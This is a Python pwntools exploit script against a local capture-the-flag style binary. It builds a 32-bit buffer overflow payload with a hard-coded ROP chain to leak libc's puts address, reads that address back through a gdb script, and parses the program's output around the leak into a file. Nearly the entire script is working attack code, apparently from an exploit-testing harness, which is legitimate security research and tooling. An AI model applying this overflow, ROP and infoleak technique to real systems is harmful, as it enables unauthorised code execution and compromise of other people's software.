from pwn import *

import sf
import sys

target = process("./chall-test_LocalLibcId-encrpyt19-pwn0")
gdb.attach(target, execute="get_libc_puts_address")

bof_payload = sf.BufferOverflow(arch=32)

bof_payload.set_input_start(0x50)
rop_chain = [134513552, b'0000', 134518896]
bof_payload.add_rop_chain(rop_chain)
payload = bof_payload.generate_payload()
target.sendline(payload)
# Function to parse out last bit of output
def getLastInput(line, address):
		i = 0
		found = False
		while found == False:
		# Check if we found the spot of the libc puts infoleak
				if ((line[i] == (address & 0xff)) and (line[i + 1] == ((address & 0xff00) >> 8)) and (line[i + 2] == ((address & 0xff0000) >> 16)) and (line[i + 3] == ((address & 0xff000000) >> 24))):
					found = True
				i += 1

		# Return the output text before the leak
		remainderOutput = ""
		if i != 0:
			remainderOutput = line[0:(i - 1)]
		return remainderOutput

# Helper function to report filler Output
def report(filler_output):
	output_file = open("justifies", "wb")
	output_file.write(filler_output)
	output_file.close()
	sys.exit(0)

# Scan in all of the input
foundEnd = False
output = b""
while foundEnd == False:
	try:
		output += target.recvline()
	except:
		foundEnd = True

# Pause to wait for gdb script
time.sleep(.5)

# Scan in the puts address
putsFile = open("far-cry", "r")
putsAddress = putsFile.read()
putsFile.close()
putsAddress = int(putsAddress, 16)


# Break up the input by newline characters
outputLines = output.split(b"\n")
# Early termination if there is little output
if len(outputLines) == 2:
	finalOutput = getLastInput(outputLines[0], putsAddress)
	report(finalOutput)

# Parse out the filler output
filler_output = outputLines[:-2]
filler_output = b"\\n".join(filler_output)
filler_output += b"\\n"

# Append the final output
finalOutput = getLastInput(outputLines[-2], putsAddress)
filler_output = filler_output + finalOutput

report(filler_output)


